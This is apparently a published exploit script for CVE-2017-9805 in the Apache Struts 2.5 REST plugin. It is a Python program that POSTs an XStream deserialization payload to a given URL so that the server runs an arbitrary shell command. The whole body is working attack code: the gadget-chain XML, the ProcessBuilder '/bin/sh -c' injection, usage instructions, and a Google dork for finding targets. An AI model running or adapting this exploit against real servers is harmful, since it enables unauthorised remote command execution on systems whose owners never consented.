# Exploit Title: Struts 2.5 - 2.5.12 REST Plugin XStream RCE
# Google Dork: filetype:action
# Date: 06/09/2017
# Exploit Author: Warflop
# Vendor Homepage: https://struts.apache.org/
# Software Link: http://mirror.nbtelecom.com.br/apache/struts/2.5.10/struts-2.5.10-all.zip
# Version: Struts 2.5 – Struts 2.5.12
# Tested on: Struts 2.5.10
# CVE : 2017-9805

#!/usr/bin/env python3
# coding=utf-8
# *****************************************************
# Struts CVE-2017-9805 Exploit
# Warflop (http://securityattack.com.br/)
# Greetz: Pimps & G4mbl3r
# *****************************************************
import requests
import sys

def exploration(command):

	exploit = '''
				<map>
				<entry>
				<jdk.nashorn.internal.objects.NativeString>
				<flags>0</flags>
				<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
				<dataHandler>
				<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
				<is class="javax.crypto.CipherInputStream">
				<cipher class="javax.crypto.NullCipher">
				<initialized>false</initialized>
				<opmode>0</opmode>
				<serviceIterator class="javax.imageio.spi.FilterIterator">
				<iter class="javax.imageio.spi.FilterIterator">
				<iter class="java.util.Collections$EmptyIterator"/>
				<next class="java.lang.ProcessBuilder">
				<command>
				<string>/bin/sh</string><string>-c</string><string>'''+ command +'''</string>
				</command>
				<redirectErrorStream>false</redirectErrorStream>
				</next>
				</iter>
				<filter class="javax.imageio.ImageIO$ContainsFilter">
				<method>
				<class>java.lang.ProcessBuilder</class>
				<name>start</name>
				<parameter-types/>
				</method>
				<name>foo</name>
				</filter>
				<next class="string">foo</next>
				</serviceIterator>
				<lock/>
				</cipher>
				<input class="java.lang.ProcessBuilder$NullInputStream"/>
				<ibuffer/>
				<done>false</done>
				<ostart>0</ostart>
				<ofinish>0</ofinish>
				<closed>false</closed>
				</is>
				<consumed>false</consumed>
				</dataSource>
				<transferFlavors/>
				</dataHandler>
				<dataLen>0</dataLen>
				</value>
				</jdk.nashorn.internal.objects.NativeString>
				<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
				</entry>
				<entry>
				<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
				<jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
				</entry>
				</map>
				'''


	url = sys.argv[1]

	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0',
			'Content-Type': 'application/xml'}

	request = requests.post(url, data=exploit, headers=headers)
	print (request.text)

if len(sys.argv) < 3:
	print ('CVE: 2017-9805 - Apache Struts2 Rest Plugin Xstream RCE')
	print ('[*] Warflop - http://securityattack.com.br')
	print ('[*] Greatz: Pimps & G4mbl3r')
	print ('[*] Use: python struts2.py URL COMMAND')
	print ('[*] Example: python struts2.py http://sitevulnerable.com/struts2-rest-showcase/orders/3 id')
	exit(0)
else:
	exploration(sys.argv[2])